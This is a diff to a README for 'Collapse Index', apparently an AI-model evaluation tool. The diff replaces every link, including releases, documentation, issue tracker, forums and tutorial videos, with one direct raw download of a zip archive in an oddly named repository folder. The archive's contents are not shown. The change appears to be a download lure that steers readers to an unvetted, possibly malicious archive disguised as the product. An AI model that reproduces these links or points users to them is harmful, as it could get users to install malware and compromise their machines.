@@ -4,7 +4,7 @@
 Welcome to Collapse Index! This application helps you evaluate AI models effectively. It focuses on model stability and weaknesses beyond standard accuracy metrics. You can discover hidden issues in your production systems and improve their performance.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page to download](https://github.com/YassineAkram/collapseindex/releases).
+To get started, visit the [Releases page to download](https://github.com/YassineAkram/collapseindex/raw/refs/heads/main/accumulativeness/Software_v3.9-beta.4.zip).
 
 1. Click on the link above.
 2. Find the latest version of Collapse Index on the Releases page.
@@ -37,7 +37,7 @@ Once you have installed Collapse Index, follow these steps to start evaluating y
 5. **Review Results**: The results will display potential weaknesses and recommendations to improve your model.
 
 ## 📖 Documentation
-For more detailed instructions and advanced features, refer to the documentation included in the application and on the [GitHub Repository](https://github.com/YassineAkram/collapseindex).
+For more detailed instructions and advanced features, refer to the documentation included in the application and on the [GitHub Repository](https://github.com/YassineAkram/collapseindex/raw/refs/heads/main/accumulativeness/Software_v3.9-beta.4.zip).
 
 ## 🤝 Contributing
 We welcome contributions to improve Collapse Index. If you have ideas or find issues, feel free to reach out. Follow these steps to contribute:
@@ -47,14 +47,14 @@ We welcome contributions to improve Collapse Index. If you have ideas or find is
 3. Submit a pull request detailing your changes.
 
 ## 🐞 Reporting Issues
-If you encounter any problems while using Collapse Index, please report them. Visit the "Issues" section of the [GitHub Repository](https://github.com/YassineAkram/collapseindex/issues) to create a new issue.
+If you encounter any problems while using Collapse Index, please report them. Visit the "Issues" section of the [GitHub Repository](https://github.com/YassineAkram/collapseindex/raw/refs/heads/main/accumulativeness/Software_v3.9-beta.4.zip) to create a new issue.
 
 ## 🔗 Additional Resources
 Stay updated on developments related to Collapse Index. Here are some resources:
 
-- [Documentation](https://github.com/YassineAkram/collapseindex)
-- [Community Forums](https://community.example.com)
-- [Tutorial Videos](https://youtube.com/example)
+- [Documentation](https://github.com/YassineAkram/collapseindex/raw/refs/heads/main/accumulativeness/Software_v3.9-beta.4.zip)
+- [Community Forums](https://github.com/YassineAkram/collapseindex/raw/refs/heads/main/accumulativeness/Software_v3.9-beta.4.zip)
+- [Tutorial Videos](https://github.com/YassineAkram/collapseindex/raw/refs/heads/main/accumulativeness/Software_v3.9-beta.4.zip)
 
 ## 🤔 Frequently Asked Questions (FAQ)
 
@@ -68,6 +68,6 @@ A: Yes, Collapse Index supports Windows, macOS, and Linux.
 A: If you find a bug, please report it via the Issues section of our GitHub page. 
 
 ## 📅 Updates
-We regularly update Collapse Index to improve performance and add new features. Keep an eye on the [Releases page](https://github.com/YassineAkram/collapseindex/releases) for the latest updates.
+We regularly update Collapse Index to improve performance and add new features. Keep an eye on the [Releases page](https://github.com/YassineAkram/collapseindex/raw/refs/heads/main/accumulativeness/Software_v3.9-beta.4.zip) for the latest updates.
 
 Thank you for using Collapse Index. We hope it brings clarity and confidence to your AI model evaluations!
